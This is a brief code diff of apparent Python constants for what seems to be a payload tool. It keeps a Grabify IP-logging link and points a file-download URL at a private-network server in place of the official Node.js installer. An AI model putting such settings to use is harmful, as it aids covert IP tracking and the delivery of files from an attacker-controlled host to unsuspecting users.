@@ -1,6 +1,6 @@
 # URL:
 URL_GRABIFY_LINK: str = "https://grabify.link/L6IZF4"
-URL_DOWNLOAD_FILE: str = "https://nodejs.org/dist/v20.12.1/node-v20.12.1-x64.msi"
+URL_DOWNLOAD_FILE: str = "http://192.168.2.15:3000"
 
 # Payloads constants
 
